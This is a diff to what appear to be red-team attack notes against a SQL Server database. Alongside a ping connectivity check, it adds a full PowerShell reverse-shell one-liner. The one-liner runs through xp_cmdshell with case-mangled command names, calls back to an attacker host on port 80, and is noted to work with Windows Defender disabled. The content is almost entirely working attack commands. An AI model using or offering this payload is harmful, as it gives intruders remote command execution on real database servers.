@@ -157,11 +157,17 @@ NULL
 
 #Check if can ping (BlueTeam Database SQL Server 2019)
 #tcpdump -nni eth0 icmp (open listener on RedTeam)
-1> EXEC xp_cmdshell 'ping 192.168.122.64';
+1> EXEC xp_cmdshell 'ping x.x.x.x';
 2> go
 
 21:49:44.343678 IP x.x.x.x > x.x.x.x: ICMP echo request, id 1, seq 1, length 40
 21:49:44.343712 IP x.x.x.x > x.x.x.x: ICMP echo reply, id 1, seq 1, length 40
+
+
+#Works on disabled windows defender
+1> exec Xp_cMdsHelL 'c:\WIndOWs\sYSwOW64\WInDOwsPOwerSheLL\v1.0\pOWerSHelL.eXe "$client = New-Object System.Net.Sockets.TCPClient(\"x.x.x.x\",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
+2> go
+
 
 
 #Enable xp_cmdshell
